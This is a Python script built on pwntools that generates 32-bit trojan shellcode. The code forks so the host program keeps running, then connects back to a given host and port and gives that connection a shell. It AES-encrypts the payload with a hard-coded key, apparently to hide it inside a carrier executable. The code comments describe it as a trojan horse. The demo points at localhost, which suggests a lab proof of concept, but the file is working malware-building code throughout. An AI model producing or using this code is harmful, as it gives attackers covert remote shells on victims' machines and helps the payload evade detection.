from Crypto.Cipher import AES 
from pwn import *


def gen_shellcode(host, port, register_with_addr='eax', target=None, verbose=False):
    # target is the filename of an executable; it can be useful, but the shellcode is 32-bit like
    # the shellcode is called in the main program with something like: call *%eax, you have to look at the compiled program
    # and modify this part of the shellcode accordingly
    if target is not None:
        elf = ELF(target)
        context.binary = elf
    # remember that eax, ecx and edx are caller-saved
    # shellcraft.forkexit is not good because it makes the parent exit, not good for a trojan horse
    # fork returns 0 in child and newly created process' PID in parent
    indent = ' ' * 4
    assembly = shellcraft.push(register_with_addr)
    # assembly += shellcraft.getpid()
    # assembly += shellcraft.mov('ecx', 'eax')
    assembly += shellcraft.fork()
    assembly += shellcraft.mov('edx', 'eax')
    assembly += indent + 'xor eax, eax\n'
    assembly += indent + 'cmp edx, 0\n'
    # loads CC flags to AH register, because we can't use jump to label; https://pdos.csail.mit.edu/6.828/2008/readings/i386/LAHF.htm
    assembly += indent + 'lahf\n'
    assembly += indent + 'and ah, 0x40\n'  # select zero-flag
    assembly += indent + 'shr eax, 14\n'  # shift right N times to obtain 1 or 0 in EAX
    assembly += indent + 'xor eax, 0x1\n' # flip the bit
    assembly += shellcraft.mov('ecx', 'eax')
    assembly += indent + 'pop edx\n' # I will compute where to jump, now in edx there is the first address of the shellcode
    
    rev_shell = shellcraft.connect(host, port) # socket fd in edx
    # duplicate sock to stdin, stdout and stderr and spawns a shell
    rev_shell += shellcraft.dupsh(sock='edx')
    rev_shell += shellcraft.exit()

    assembly += indent + 'imul ecx, {}\n'.format(len(asm(rev_shell)))
    assembly += indent + 'add edx, ecx\n'

    partial_len = len(asm(assembly))
    offset = partial_len + len(asm('add edx, {}\n'.format(partial_len))) + len(asm('jmp edx\n'))

    assembly += indent + 'add edx, {}\n'.format(offset)
    assembly += indent + 'jmp edx\n'
    assert len(asm(assembly)) == offset

    assembly += rev_shell
    assembly += indent + 'ret\n'
    
    if verbose:
        print(assembly)
    return asm(assembly)


def pad(s, block_len=16):
    return s + ((block_len - len(s) % block_len) * chr(block_len - len(s) % block_len)).encode()


def AES_encrypt_shellcode(shellcode, key):
    obj = AES.new(key.encode(), AES.MODE_ECB)
    message = pad(shellcode)
    ciphertext = obj.encrypt(message)
    return ciphertext

def to_hex(_bytes):
    return "".join(["\\x{:02x}".format(b) for b in _bytes])


if __name__ == "__main__":
    # payload = gen_shellcode("127.0.0.1", 5000, target="./execute_poc", verbose=False)
    # print(len(payload))
    # hex(b).replace('0x', '\\x')
    # print("".join(["\\x{:02x}".format(b) for b in payload]))
    payload_m32 = gen_shellcode("127.0.0.1", 5000, target="./execute_poc_m32", verbose=False)
    print(len(payload_m32))
    print(to_hex(payload_m32))
    key = 'this is a key123'
    ciphertext = AES_encrypt_shellcode(payload_m32, key)
    print()
    print(len(ciphertext))
    print(to_hex(ciphertext))
